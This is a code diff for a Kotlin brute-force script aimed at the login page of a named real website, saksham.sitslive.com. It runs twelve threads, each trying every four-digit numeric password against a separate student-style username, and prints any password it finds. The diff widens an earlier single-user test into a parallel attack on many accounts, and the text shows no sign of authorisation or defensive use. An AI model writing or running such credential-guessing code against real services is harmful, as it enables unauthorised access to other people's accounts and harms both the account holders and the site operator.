@@ -9,8 +9,31 @@ import kotlin.concurrent.thread
 import kotlin.system.measureTimeMillis
 
 
+
+fun main() {
+
+    //This machine has a 6 cores hyper-threaded CPU,
+    //so don't run more than 12 bruteForceTask on this machine
+
+    bruteforceTask("2023/2507", "T1")
+    bruteforceTask("2023/2508", "T2")
+    bruteforceTask("2023/2509", "T3")
+    bruteforceTask("2023/2510", "T4")
+    bruteforceTask("2023/2511", "T5")
+    bruteforceTask("2023/2512", "T6")
+    bruteforceTask("2023/2513", "T7")
+    bruteforceTask("2023/2514", "T8")
+    bruteforceTask("2023/2515", "T9")
+    bruteforceTask("2023/2516", "T10")
+    bruteforceTask("2023/2517", "T11")
+    bruteforceTask("2023/2518", "T12")
+}
+
+
+
+const val url = "https://saksham.sitslive.com/login"
+
 fun attemptLogin(username: String, password: String, client: CloseableHttpClient): String? {
-    val url = "https://saksham.sitslive.com/login"
 
     val post = HttpPost(url).apply {
         addHeader("accept", "*/*")
@@ -45,21 +68,34 @@ fun attemptLogin(username: String, password: String, client: CloseableHttpClient
     }
 }
 
-fun main() {
+fun bruteforce(username:String, start:Int=1000, end:Int=10000): String? {
     val client: CloseableHttpClient = HttpClients.createDefault()
-
-    val threads = mutableListOf<Thread>()
-    val tt = measureTimeMillis {
-        for(i in 3773..3873){
-            val thread = thread {
-                println("Thread created $i")
-                val result = attemptLogin("2023/0399", i.toString(), client)
-                println("Login result: ${result ?: "Login failed"}")
-            }
-            threads.add(thread)
+    for (i in start..end) {
+        val password = attemptLogin(username, i.toString(), client)
+        if (password != null) {
+            return password
         }
-        threads.forEach { it.join() }
     }
     client.close()
-    println("Time taken: $tt ms")
+    return null
 }
+
+//Beware that it creates a new thread and run bruteforce method on in it
+
+fun bruteforceTask(username:String, threadName:String){
+    thread {
+        val threadExecutionTime = measureTimeMillis {
+            println("Thread $threadName started...")
+            val password = bruteforce(username)
+            if(password.isNullOrBlank()){
+                println("User does not exist")
+            }
+            else{
+                println("Password found of $username: $password")
+            }
+        }
+        println("Bruteforce finished by thread $threadName in: $threadExecutionTime ms")
+    }
+}
+
+
